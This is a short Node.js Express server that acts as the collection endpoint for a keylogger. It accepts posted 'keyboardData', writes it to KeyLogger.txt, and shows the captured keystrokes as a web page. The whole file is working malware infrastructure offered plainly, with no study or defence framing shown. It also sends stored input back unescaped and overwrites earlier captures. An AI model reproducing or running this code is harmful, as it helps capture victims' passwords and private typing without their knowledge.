const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

app.use(bodyParser.json({ extended: true }));

const port = 8080;

app.get("/", (req, res) => {
  try {
    const kl_file = fs.readFileSync("./KeyLogger.txt", {
      encoding: "utf8",
      flag: "r",
    });
    res.send(`${kl_file.replace("\n", "<br>")}`);
  } catch {
    res.send("<h1>Nothing logged yet.</h1>");
  }
});

app.post("/", (req, res) => {
  console.log(req.body.keyboardData);
  fs.writeFileSync("KeyLogger.txt", req.body.keyboardData);
  res.send("Successfully set the data");
});

app.listen(port, () => {
  console.log(`App is listening on port ${port}`);
});
